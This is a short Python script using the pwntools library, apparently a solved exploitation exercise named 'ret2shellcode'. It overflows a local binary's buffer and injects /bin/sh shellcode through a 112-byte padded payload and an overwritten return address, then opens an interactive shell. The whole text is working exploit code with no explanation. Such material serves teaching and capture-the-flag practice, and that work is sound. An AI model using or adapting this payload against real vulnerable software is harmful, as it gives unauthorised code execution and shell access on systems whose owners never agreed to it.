from pwn import *
from pwnlib.util.packing import p32

sh = process('binary/ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080
payload = shellcode.ljust(112, b'A') + p32(buf2_addr)
sh.sendline(payload)
sh.interactive()